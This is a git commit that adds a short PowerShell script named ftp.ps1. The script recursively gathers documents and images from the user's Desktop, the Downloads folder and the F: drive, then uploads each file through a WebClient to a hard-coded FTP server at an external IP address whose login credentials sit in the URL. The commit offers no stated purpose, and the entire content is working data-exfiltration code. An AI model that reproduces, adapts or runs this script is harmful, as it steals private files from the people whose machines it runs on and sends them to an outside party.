20c9ccb93dd5f3d81fa7ea1a00834fdc24040ff4
louist12 <114141279+louist12@users.noreply.github.com>
2022-10-10 00:19:01 -0700

    Add files via upload

---
+++ ftp.ps1
@@ -0,0 +1,9 @@
+﻿$Dir = "C:\Users\$env:username\desktop","C:\Users\$env:username\Downloads","F:\"
+$FTP = "ftp://testadmin:testpassword@192.119.71.89/files/"
+$web=New-Object System.Net.WebClient
+
+foreach($item in (Get-ChildItem $Dir -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.jpeg,*.jpg,*.png -Recurse)){
+    $URI = New-Object System.Uri($FTP+$item.Name)
+    $web.UploadFile($URI, $item.FullName)
+}
+
